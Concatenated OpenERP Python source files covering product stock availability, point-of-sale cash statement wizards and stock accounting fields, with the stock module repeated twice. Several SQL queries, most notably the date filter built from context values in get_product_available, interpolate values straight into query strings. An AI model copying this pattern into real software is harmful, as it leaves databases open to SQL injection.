            location_ids = []
            wids = self.pool.get('stock.warehouse').search(cr, uid, [], context=context)
            for w in self.pool.get('stock.warehouse').browse(cr, uid, wids, context=context):
                location_ids.append(w.lot_stock_id.id)

        # build the list of ids of children of the location given by id
        if context.get('compute_child',True):
            child_location_ids = self.pool.get('stock.location').search(cr, uid, [('location_id', 'child_of', location_ids)])
            location_ids = child_location_ids or location_ids
        else:
            location_ids = location_ids

        uoms_o = {}
        product2uom = {}
        for product in self.browse(cr, uid, ids, context=context):
            product2uom[product.id] = product.uom_id.id
            uoms_o[product.uom_id.id] = product.uom_id

        results = []
        results2 = []

        from_date=context.get('from_date',False)                    
        to_date=context.get('to_date',False)                    
        date_str=False                    
        if from_date and to_date:
            date_str="date_planned>='%s' and date_planned<='%s'"%(from_date,to_date)                    
        elif from_date:
            date_str="date_planned>='%s'"%(from_date)                    
        elif to_date:
            date_str="date_planned<='%s'"%(to_date)                    

        if 'in' in what:
            # all moves from a location out of the set to a location in the set
            cr.execute(
                'select sum(product_qty), product_id, product_uom '\
                'from stock_move '\
                'where location_id NOT IN %s'\
                'and location_dest_id IN %s'\
                'and product_id IN %s'\
                'and state IN %s' + (date_str and 'and '+date_str+' ' or '') +''\
                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)                    
            )
            results = cr.fetchall()
        if 'out' in what:
            # all moves from a location in the set to a location out of the set
            cr.execute(
                'select sum(product_qty), product_id, product_uom '\
                'from stock_move '\
                'where location_id IN %s'\
                'and location_dest_id NOT IN %s '\
                'and product_id  IN %s'\
                'and state in %s' + (date_str and 'and '+date_str+' ' or '') + ''\
                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)                    
            )
            results2 = cr.fetchall()
        uom_obj = self.pool.get('product.uom')
        uoms = map(lambda x: x[2], results) + map(lambda x: x[2], results2)
        if context.get('uom', False):
            uoms += [context['uom']]

        uoms = filter(lambda x: x not in uoms_o.keys(), uoms)
        if uoms:
            uoms = uom_obj.browse(cr, uid, list(set(uoms)), context=context)
        for o in uoms:
            uoms_o[o.id] = o
        for amount, prod_id, prod_uom in results:
            amount = uom_obj._compute_qty_obj(cr, uid, uoms_o[prod_uom], amount,
                    uoms_o[context.get('uom', False) or product2uom[prod_id]])
            res[prod_id] += amount
        for amount, prod_id, prod_uom in results2:
            amount = uom_obj._compute_qty_obj(cr, uid, uoms_o[prod_uom], amount,
                    uoms_o[context.get('uom', False) or product2uom[prod_id]])
            res[prod_id] -= amount
        return res

    def _product_available(self, cr, uid, ids, field_names=None, arg=False, context=None):
        """ Finds the incoming and outgoing quantity of product.
        @return: Dictionary of values
        """
        if not field_names:
            field_names = []
        if context is None:
            context = {}
        res = {}
        for id in ids:
            res[id] = {}.fromkeys(field_names, 0.0)
        for f in field_names:
            c = context.copy()
            if f == 'qty_available':
                c.update({ 'states': ('done',), 'what': ('in', 'out') })
            if f == 'virtual_available':
                c.update({ 'states': ('confirmed','waiting','assigned','done'), 'what': ('in', 'out') })
            if f == 'incoming_qty':
                c.update({ 'states': ('confirmed','waiting','assigned'), 'what': ('in',) })
            if f == 'outgoing_qty':
                c.update({ 'states': ('confirmed','waiting','assigned'), 'what': ('out',) })
            stock = self.get_product_available(cr, uid, ids, context=c)
            for id in ids:
                res[id][f] = stock.get(id, 0.0)
        return res

    _columns = {
        'qty_available': fields.function(_product_available, method=True, type='float', string='Real Stock', help="Current quantities of products in selected locations or all internal if none have been selected.", multi='qty_available'),
        'virtual_available': fields.function(_product_available, method=True, type='float', string='Virtual Stock', help="Future stock for this product according to the selected locations or all internal if none have been selected. Computed as: Real Stock - Outgoing + Incoming.", multi='qty_available'),
        'incoming_qty': fields.function(_product_available, method=True, type='float', string='Incoming', help="Quantities of products that are planned to arrive in selected locations or all internal if none have been selected.", multi='qty_available'),
        'outgoing_qty': fields.function(_product_available, method=True, type='float', string='Outgoing', help="Quantities of products that are planned to leave in selected locations or all internal if none have been selected.", multi='qty_available'),
        'track_production': fields.boolean('Track Manufacturing Lots' , help="Forces to specify a Production Lot for all moves containing this product and generated by a Manufacturing Order"),
        'track_incoming': fields.boolean('Track Incoming Lots', help="Forces to specify a Production Lot for all moves containing this product and coming from a Supplier Location"),
        'track_outgoing': fields.boolean('Track Outgoing Lots', help="Forces to specify a Production Lot for all moves containing this product and going to a Customer Location"),
        'location_id': fields.dummy(string='Stock Location', relation='stock.location', type='many2one'),
        'valuation':fields.selection([('manual_periodic', 'Periodical (manual)'),
                                        ('real_time','Real Time (automated)'),], 'Inventory Valuation', 
                                        help="If real-time valuation is enabled for a product, the system will automatically write journal entries corresponding to stock moves." \
                                             "The inventory variation account set on the product category will represent the current inventory value, and the stock input and stock output account will hold the counterpart moves for incoming and outgoing products."
                                        , required=True),
    }

    _defaults = {
        'valuation': lambda *a: 'manual_periodic',
    }

    def fields_view_get(self, cr, uid, view_id=None, view_type='form', context=None, toolbar=False, submenu=False):
        res = super(product_product,self).fields_view_get(cr, uid, view_id, view_type, context, toolbar=toolbar, submenu=submenu)
        if context is None:
            context = {}
        if ('location' in context) and context['location']:
            location_info = self.pool.get('stock.location').browse(cr, uid, context['location'])
            fields=res.get('fields',{})
            if fields:
                if location_info.usage == 'supplier':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Receptions')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('Received Qty')

                if location_info.usage == 'internal':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Stock')

                if location_info.usage == 'customer':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Deliveries')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('Delivered Qty')

                if location_info.usage == 'inventory':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future P&L')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('P&L Qty')

                if location_info.usage == 'procurement':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Qty')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('Unplanned Qty')

                if location_info.usage == 'production':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Productions')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('Produced Qty')
        return res

product_product()

class product_template(osv.osv):
    _name = 'product.template'
    _inherit = 'product.template'
    _columns = {
        'property_stock_procurement': fields.property(
            'stock.location',
            type='many2one',
            relation='stock.location',
            string="Procurement Location",
            method=True,
            view_load=True,
            domain=[('usage','like','procurement')],
            help="For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated by procurements"),
        'property_stock_production': fields.property(
            'stock.location',
            type='many2one',
            relation='stock.location',
            string="Production Location",
            method=True,
            view_load=True,
            domain=[('usage','like','production')],
            help="For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated by production orders"),
        'property_stock_inventory': fields.property(
            'stock.location',
            type='many2one',
            relation='stock.location',
            string="Inventory Location",
            method=True,
            view_load=True,
            domain=[('usage','like','inventory')],
            help="For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated when you do an inventory"),
        'property_stock_account_input': fields.property('account.account',
            type='many2one', relation='account.account',
            string='Stock Input Account', method=True, view_load=True,
            help='When doing real-time inventory valuation, counterpart Journal Items for all incoming stock moves will be posted in this account. If not set on the product, the one from the product category is used.'),
        'property_stock_account_output': fields.property('account.account',
            type='many2one', relation='account.account',
            string='Stock Output Account', method=True, view_load=True,
            help='When doing real-time inventory valuation, counterpart Journal Items for all outgoing stock moves will be posted in this account. If not set on the product, the one from the product category is used.'),
    }

product_template()

class product_category(osv.osv):

    _inherit = 'product.category'
    _columns = {
        'property_stock_journal': fields.property('account.journal',
            relation='account.journal', type='many2one',
            string='Stock journal', method=True, view_load=True,
            help="When doing real-time inventory valuation, this is the Accounting Journal in which entries will be automatically posted when stock moves are processed."),
        'property_stock_account_input_categ': fields.property('account.account',
            type='many2one', relation='account.account',
            string='Stock Input Account', method=True, view_load=True,
            help='When doing real-time inventory valuation, counterpart Journal Items for all incoming stock moves will be posted in this account. This is the default value for all products in this category, it can also directly be set on each product.'),
        'property_stock_account_output_categ': fields.property('account.account',
            type='many2one', relation='account.account',
            string='Stock Output Account', method=True, view_load=True,
            help='When doing real-time inventory valuation, counterpart Journal Items for all outgoing stock moves will be posted in this account. This is the default value for all products in this category, it can also directly be set on each product.'),
        'property_stock_variation': fields.property('account.account',
            type='many2one',
            relation='account.account',
            string="Stock Variation Account",
            method=True, view_load=True,
            help="When real-time inventory valuation is enabled on a product, this account will hold the current value of the products.",),
    }

product_category()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:

# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution
#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from osv import osv
from tools.translate import _

class pos_close_statement(osv.osv_memory):
    _name = 'pos.close.statement'
    _description = 'Close Statements'

    def close_statement(self, cr, uid, ids, context):
        """
             Close the statements
             @param self: The object pointer.
             @param cr: A database cursor
             @param uid: ID of the user currently logged in
             @param context: A standard dictionary
             @return : Blank Dictionary
        """
        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id
        list_statement = []
        mod_obj = self.pool.get('ir.model.data')
        statement_obj = self.pool.get('account.bank.statement')
        journal_obj = self.pool.get('account.journal')
        cr.execute("""select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id"""%(uid))
        j_ids = map(lambda x1: x1[0], cr.fetchall())
        cr.execute(""" select id from account_journal                    
                            where auto_cash='True' and type='cash'                    
                            and id in (%s)""" %(','.join(map(lambda x: "'" + str(x) + "'", j_ids))))                    
        journal_ids = map(lambda x1: x1[0], cr.fetchall())                    

        for journal in journal_obj.browse(cr, uid, journal_ids):
            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])
            if not ids:
                raise osv.except_osv(_('Message'), _('Journals are already closed'))
            else:
                list_statement.append(ids[0])
                if not journal.check_dtls:
                    statement_obj.button_confirm_cash(cr, uid, ids, context)
    #        if not list_statement:
    #            return {}
    #        model_data_ids = mod_obj.search(cr, uid,[('model','=','ir.ui.view'),('name','=','view_bank_statement_tree')], context=context)
    #        resource_id = mod_obj.read(cr, uid, model_data_ids, fields=['res_id'], context=context)[0]['res_id']

        data_obj = self.pool.get('ir.model.data')
        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')
        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')
        if id2:
            id2 = data_obj.browse(cr, uid, id2, context=context).res_id
        if id3:
            id3 = data_obj.browse(cr, uid, id3, context=context).res_id
        return {
                'domain': "[('id','in'," + str(list_statement) + ")]",
                'name': 'Close Statements',
                'view_type': 'form',
                'view_mode': 'tree,form',
                'res_model': 'account.bank.statement',
                'views': [(id2, 'tree'),(id3, 'form')],
                'type': 'ir.actions.act_window'}

pos_close_statement()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:

# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution
#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from osv import osv
from tools.translate import _
import time

class pos_open_statement(osv.osv_memory):
    _name = 'pos.open.statement'
    _description = 'Open Statements'

    def open_statement(self, cr, uid, ids, context):
        """
             Open the statements
             @param self: The object pointer.
             @param cr: A database cursor
             @param uid: ID of the user currently logged in
             @param context: A standard dictionary
             @return : Blank Directory
        """
        list_statement = []
        mod_obj = self.pool.get('ir.model.data')
        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id
        statement_obj = self.pool.get('account.bank.statement')
        sequence_obj = self.pool.get('ir.sequence')
        journal_obj = self.pool.get('account.journal')
        cr.execute("""select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id"""%(uid))
        j_ids = map(lambda x1: x1[0], cr.fetchall())
        cr.execute(""" select id from account_journal                    
                            where auto_cash='True' and type='cash'                    
                            and id in (%s)""" %(','.join(map(lambda x: "'" + str(x) + "'", j_ids))))                    
        journal_ids = map(lambda x1: x1[0], cr.fetchall())                    

        for journal in journal_obj.browse(cr, uid, journal_ids):
            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])
            if len(ids):
                raise osv.except_osv(_('Message'), _('You can not open a Cashbox for "%s". \n Please close the cashbox related to. ' %(journal.name)))
            
#            cr.execute(""" Select id from account_bank_statement
#                                    where journal_id =%d
#                                    and company_id =%d
#                                    order by id desc limit 1""" %(journal.id, company_id))
#            st_id = cr.fetchone()
            
            number = ''
            if journal.sequence_id:
                number = sequence_obj.get_id(cr, uid, journal.sequence_id.id)
            else:
                number = sequence_obj.get(cr, uid, 'account.bank.statement')
            
            statement_id = statement_obj.create(cr, uid, {'journal_id': journal.id,
                                                          'company_id': company_id,
                                                          'user_id': uid,
                                                          'state': 'open',
                                                          'name': number,
                                                          'starting_details_ids': statement_obj._get_cash_close_box_lines(cr, uid, []),
                                                      })
            statement_obj.button_open(cr, uid, [statement_id], context)

    #            period = statement_obj._get_period(cr, uid, context) or None
    #            cr.execute("INSERT INTO account_bank_statement(journal_id,company_id,user_id,state,name, period_id,date) VALUES(%d,%d,%d,'open','%s',%d,'%s')"%(journal.id, company_id, uid, number, period, time.strftime('%Y-%m-%d %H:%M:%S')))
    #            cr.commit()
    #            cr.execute("select id from account_bank_statement where journal_id=%d and company_id=%d and user_id=%d and state='open' and name='%s'"%(journal.id, company_id, uid, number))
    #            statement_id = cr.fetchone()[0]
    #            print "statement_id",statement_id
    #            if st_id:
    #                statemt_id = statement_obj.browse(cr, uid, st_id[0])
    #                list_statement.append(statemt_id.id)
    #                if statemt_id and statemt_id.ending_details_ids:
    #                    statement_obj.write(cr, uid, [statement_id], {
    #                        'balance_start': statemt_id.balance_end,
    #                        'state': 'open',
    #                    })
    #                    if statemt_id.ending_details_ids:
    #                        for i in statemt_id.ending_details_ids:
    #                            c = statement_obj.create(cr, uid, {
    #                                'pieces': i.pieces,
    #                                'number': i.number,
    #                                'starting_id': statement_id,
    #                            })
        data_obj = self.pool.get('ir.model.data')
        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')
        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')
        if id2:
            id2 = data_obj.browse(cr, uid, id2, context=context).res_id
        if id3:
            id3 = data_obj.browse(cr, uid, id3, context=context).res_id

        return {
#           'domain': "[('id','in', ["+','.join(map(str,list_statement))+"])]",
            'domain': "[('state','=','open')]",
            'name': 'Open Statement',
            'view_type': 'form',
            'view_mode': 'tree,form',
            'res_model': 'account.bank.statement',
            'views': [(id2, 'tree'),(id3, 'form')],
            'type': 'ir.actions.act_window'
}
pos_open_statement()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:

# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution
#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from osv import fields, osv
from tools.translate import _

class product_product(osv.osv):
    _inherit = "product.product"

    def get_product_accounts(self, cr, uid, product_id, context=None):
        """ To get the stock input account, stock output account and stock journal related to product.
        @param product_id: product id
        @return: dictionary which contains information regarding stock input account, stock output account and stock journal
        """
        if context is None:
            context = {}
        product_obj = self.pool.get('product.product').browse(cr, uid, product_id, context=context)

        stock_input_acc = product_obj.property_stock_account_input and product_obj.property_stock_account_input.id or False
        if not stock_input_acc:
            stock_input_acc = product_obj.categ_id.property_stock_account_input_categ and product_obj.categ_id.property_stock_account_input_categ.id or False

        stock_output_acc = product_obj.property_stock_account_output and product_obj.property_stock_account_output.id or False
        if not stock_output_acc:
            stock_output_acc = product_obj.categ_id.property_stock_account_output_categ and product_obj.categ_id.property_stock_account_output_categ.id or False

        journal_id = product_obj.categ_id.property_stock_journal and product_obj.categ_id.property_stock_journal.id or False
        account_variation = product_obj.categ_id.property_stock_variation and product_obj.categ_id.property_stock_variation.id or False

        return {
            'stock_account_input': stock_input_acc,
            'stock_account_output': stock_output_acc,
            'stock_journal': journal_id,
            'property_stock_variation': account_variation
        }

    def do_change_standard_price(self, cr, uid, ids, datas, context={}):
        """ Changes the Standard Price of Product and creates an account move accordingly.
        @param datas : dict. contain default datas like new_price, stock_output_account, stock_input_account, stock_journal
        @param context: A standard dictionary
        @return:

        """
        location_obj = self.pool.get('stock.location')
        move_obj = self.pool.get('account.move')
        move_line_obj = self.pool.get('account.move.line')

        new_price = datas.get('new_price', 0.0)
        stock_output_acc = datas.get('stock_output_account', False)
        stock_input_acc = datas.get('stock_input_account', False)
        journal_id = datas.get('stock_journal', False)
        product_obj=self.browse(cr,uid,ids)[0]
        account_variation = product_obj.categ_id.property_stock_variation
        account_variation_id = account_variation and account_variation.id or False
        if not account_variation_id: raise osv.except_osv(_('Error!'), _('Variation Account is not specified for Product Category: %s' % (product_obj.categ_id.name)))
        move_ids = []
        loc_ids = location_obj.search(cr, uid,[('usage','=','internal')])
        for rec_id in ids:
            for location in location_obj.browse(cr, uid, loc_ids):
                c = context.copy()
                c.update({
                    'location': location.id,
                    'compute_child': False
                })

                product = self.browse(cr, uid, rec_id, context=c)
                qty = product.qty_available
                diff = product.standard_price - new_price
                if not diff: raise osv.except_osv(_('Error!'), _("Could not find any difference between standard price and new price!"))
                if qty:
                    company_id = location.company_id and location.company_id.id or False
                    if not company_id: raise osv.except_osv(_('Error!'), _('Company is not specified in Location'))
                    #
                    # Accounting Entries
                    #
                    if not journal_id:
                        journal_id = product.categ_id.property_stock_journal and product.categ_id.property_stock_journal.id or False
                    if not journal_id:
                        raise osv.except_osv(_('Error!'),
                            _('There is no journal defined '\
                                'on the product category: "%s" (id: %d)') % \
                                (product.categ_id.name,
                                    product.categ_id.id,))
                    move_id = move_obj.create(cr, uid, {
                                'journal_id': journal_id,
                                'company_id': company_id
                                })

                    move_ids.append(move_id)


                    if diff > 0:
                        if not stock_input_acc:
                            stock_input_acc = product.product_tmpl_id.\
                                property_stock_account_input.id
                        if not stock_input_acc:
                            stock_input_acc = product.categ_id.\
                                    property_stock_account_input_categ.id
                        if not stock_input_acc:
                            raise osv.except_osv(_('Error!'),
                                    _('There is no stock input account defined ' \
                                            'for this product: "%s" (id: %d)') % \
                                            (product.name,
                                                product.id,))
                        amount_diff = qty * diff
                        move_line_obj.create(cr, uid, {
                                    'name': product.name,
                                    'account_id': stock_input_acc,
                                    'debit': amount_diff,
                                    'move_id': move_id,
                                    })
                        move_line_obj.create(cr, uid, {
                                    'name': product.categ_id.name,
                                    'account_id': account_variation_id,
                                    'credit': amount_diff,
                                    'move_id': move_id
                                    })
                    elif diff < 0:
                        if not stock_output_acc:
                            stock_output_acc = product.product_tmpl_id.\
                                property_stock_account_output.id
                        if not stock_output_acc:
                            stock_output_acc = product.categ_id.\
                                    property_stock_account_output_categ.id
                        if not stock_output_acc:
                            raise osv.except_osv(_('Error!'),
                                    _('There is no stock output account defined ' \
                                            'for this product: "%s" (id: %d)') % \
                                            (product.name,
                                                product.id,))
                        amount_diff = qty * -diff
                        move_line_obj.create(cr, uid, {
                                        'name': product.name,
                                        'account_id': stock_output_acc,
                                        'credit': amount_diff,
                                        'move_id': move_id
                                    })
                        move_line_obj.create(cr, uid, {
                                        'name': product.categ_id.name,
                                        'account_id': account_variation_id,
                                        'debit': amount_diff,
                                        'move_id': move_id
                                    })

            self.write(cr, uid, rec_id, {'standard_price': new_price})

        return move_ids

    def view_header_get(self, cr, user, view_id, view_type, context=None):
        if context is None:
            context = {}
        res = super(product_product, self).view_header_get(cr, user, view_id, view_type, context)
        if res: return res
        if (context.get('active_id', False)) and (context.get('active_model') == 'stock.location'):
            return _('Products: ')+self.pool.get('stock.location').browse(cr, user, context['active_id'], context).name
        return res

    def get_product_available(self, cr, uid, ids, context=None):
        """ Finds whether product is available or not in particular warehouse.
        @return: Dictionary of values
        """
        if context is None:
            context = {}
        states = context.get('states',[])
        what = context.get('what',())
        if not ids:
            ids = self.search(cr, uid, [])
        res = {}.fromkeys(ids, 0.0)
        if not ids:
            return res

        if context.get('shop', False):
            cr.execute('select warehouse_id from sale_shop where id=%s', (int(context['shop']),))
            res2 = cr.fetchone()
            if res2:
                context['warehouse'] = res2[0]

        if context.get('warehouse', False):
            cr.execute('select lot_stock_id from stock_warehouse where id=%s', (int(context['warehouse']),))
            res2 = cr.fetchone()
            if res2:
                context['location'] = res2[0]

        if context.get('location', False):
            if type(context['location']) == type(1):
                location_ids = [context['location']]
            elif type(context['location']) in (type(''), type(u'')):
                location_ids = self.pool.get('stock.location').search(cr, uid, [('name','ilike',context['location'])], context=context)
            else:
                location_ids = context['location']
        else:
            location_ids = []
            wids = self.pool.get('stock.warehouse').search(cr, uid, [], context=context)
            for w in self.pool.get('stock.warehouse').browse(cr, uid, wids, context=context):
                location_ids.append(w.lot_stock_id.id)

        # build the list of ids of children of the location given by id
        if context.get('compute_child',True):
            child_location_ids = self.pool.get('stock.location').search(cr, uid, [('location_id', 'child_of', location_ids)])
            location_ids = child_location_ids or location_ids
        else:
            location_ids = location_ids

        uoms_o = {}
        product2uom = {}
        for product in self.browse(cr, uid, ids, context=context):
            product2uom[product.id] = product.uom_id.id
            uoms_o[product.uom_id.id] = product.uom_id

        results = []
        results2 = []

        from_date=context.get('from_date',False)                    
        to_date=context.get('to_date',False)                    
        date_str=False                    
        if from_date and to_date:
            date_str="date_planned>='%s' and date_planned<='%s'"%(from_date,to_date)                    
        elif from_date:
            date_str="date_planned>='%s'"%(from_date)                    
        elif to_date:
            date_str="date_planned<='%s'"%(to_date)                    

        if 'in' in what:
            # all moves from a location out of the set to a location in the set
            cr.execute(
                'select sum(product_qty), product_id, product_uom '\
                'from stock_move '\
                'where location_id NOT IN %s'\
                'and location_dest_id IN %s'\
                'and product_id IN %s'\
                'and state IN %s' + (date_str and 'and '+date_str+' ' or '') +''\
                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)                    
            )
            results = cr.fetchall()
        if 'out' in what:
            # all moves from a location in the set to a location out of the set
            cr.execute(
                'select sum(product_qty), product_id, product_uom '\
                'from stock_move '\
                'where location_id IN %s'\
                'and location_dest_id NOT IN %s '\
                'and product_id  IN %s'\
                'and state in %s' + (date_str and 'and '+date_str+' ' or '') + ''\
                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)                    
            )
            results2 = cr.fetchall()
        uom_obj = self.pool.get('product.uom')
        uoms = map(lambda x: x[2], results) + map(lambda x: x[2], results2)
        if context.get('uom', False):
            uoms += [context['uom']]

        uoms = filter(lambda x: x not in uoms_o.keys(), uoms)
        if uoms:
            uoms = uom_obj.browse(cr, uid, list(set(uoms)), context=context)
        for o in uoms:
            uoms_o[o.id] = o
        for amount, prod_id, prod_uom in results:
            amount = uom_obj._compute_qty_obj(cr, uid, uoms_o[prod_uom], amount,
                    uoms_o[context.get('uom', False) or product2uom[prod_id]])
            res[prod_id] += amount
        for amount, prod_id, prod_uom in results2:
            amount = uom_obj._compute_qty_obj(cr, uid, uoms_o[prod_uom], amount,
                    uoms_o[context.get('uom', False) or product2uom[prod_id]])
            res[prod_id] -= amount
        return res

    def _product_available(self, cr, uid, ids, field_names=None, arg=False, context=None):
        """ Finds the incoming and outgoing quantity of product.
        @return: Dictionary of values
        """
        if not field_names:
            field_names = []
        if context is None:
            context = {}
        res = {}
        for id in ids:
            res[id] = {}.fromkeys(field_names, 0.0)
        for f in field_names:
            c = context.copy()
            if f == 'qty_available':
                c.update({ 'states': ('done',), 'what': ('in', 'out') })
            if f == 'virtual_available':
                c.update({ 'states': ('confirmed','waiting','assigned','done'), 'what': ('in', 'out') })
            if f == 'incoming_qty':
                c.update({ 'states': ('confirmed','waiting','assigned'), 'what': ('in',) })
            if f == 'outgoing_qty':
                c.update({ 'states': ('confirmed','waiting','assigned'), 'what': ('out',) })
            stock = self.get_product_available(cr, uid, ids, context=c)
            for id in ids:
                res[id][f] = stock.get(id, 0.0)
        return res

    _columns = {
        'qty_available': fields.function(_product_available, method=True, type='float', string='Real Stock', help="Current quantities of products in selected locations or all internal if none have been selected.", multi='qty_available'),
        'virtual_available': fields.function(_product_available, method=True, type='float', string='Virtual Stock', help="Future stock for this product according to the selected locations or all internal if none have been selected. Computed as: Real Stock - Outgoing + Incoming.", multi='qty_available'),
        'incoming_qty': fields.function(_product_available, method=True, type='float', string='Incoming', help="Quantities of products that are planned to arrive in selected locations or all internal if none have been selected.", multi='qty_available'),
        'outgoing_qty': fields.function(_product_available, method=True, type='float', string='Outgoing', help="Quantities of products that are planned to leave in selected locations or all internal if none have been selected.", multi='qty_available'),
        'track_production': fields.boolean('Track Manufacturing Lots' , help="Forces to specify a Production Lot for all moves containing this product and generated by a Manufacturing Order"),
        'track_incoming': fields.boolean('Track Incoming Lots', help="Forces to specify a Production Lot for all moves containing this product and coming from a Supplier Location"),
        'track_outgoing': fields.boolean('Track Outgoing Lots', help="Forces to specify a Production Lot for all moves containing this product and going to a Customer Location"),
        'location_id': fields.dummy(string='Stock Location', relation='stock.location', type='many2one'),
        'valuation':fields.selection([('manual_periodic', 'Periodical (manual)'),
                                        ('real_time','Real Time (automated)'),], 'Inventory Valuation', 
                                        help="If real-time valuation is enabled for a product, the system will automatically write journal entries corresponding to stock moves." \
                                             "The inventory variation account set on the product category will represent the current inventory value, and the stock input and stock output account will hold the counterpart moves for incoming and outgoing products."
                                        , required=True),
    }

    _defaults = {
        'valuation': lambda *a: 'manual_periodic',
    }

    def fields_view_get(self, cr, uid, view_id=None, view_type='form', context=None, toolbar=False, submenu=False):
        res = super(product_product,self).fields_view_get(cr, uid, view_id, view_type, context, toolbar=toolbar, submenu=submenu)
        if context is None:
            context = {}
        if ('location' in context) and context['location']:
            location_info = self.pool.get('stock.location').browse(cr, uid, context['location'])
            fields=res.get('fields',{})
            if fields:
                if location_info.usage == 'supplier':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Receptions')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('Received Qty')

                if location_info.usage == 'internal':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Stock')

                if location_info.usage == 'customer':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Deliveries')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('Delivered Qty')

                if location_info.usage == 'inventory':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future P&L')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('P&L Qty')

                if location_info.usage == 'procurement':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Qty')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('Unplanned Qty')

                if location_info.usage == 'production':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Productions')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('Produced Qty')
        return res

product_product()

class product_template(osv.osv):
    _name = 'product.template'
    _inherit = 'product.template'
    _columns = {
        'property_stock_procurement': fields.property(
            'stock.location',
            type='many2one',
            relation='stock.location',
            string="Procurement Location",
            method=True,
            view_load=True,
            domain=[('usage','like','procurement')],
            help="For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated by procurements"),
        'property_stock_production': fields.property(
            'stock.location',
            type='many2one',
            relation='stock.location',
            string="Production Location",
            method=True,
            view_load=True,
            domain=[('usage','like','production')],
            help="For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated by production orders"),
        'property_stock_inventory': fields.property(
            'stock.location',
            type='many2one',
            relation='stock.location',
            string="Inventory Location",
            method=True,
            view_load=True,
            domain=[('usage','like','inventory')],
            help="For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated when you do an inventory"),
        'property_stock_account_input': fields.property('account.account',
            type='many2one', relation='account.account',
            string='Stock Input Account', method=True, view_load=True,
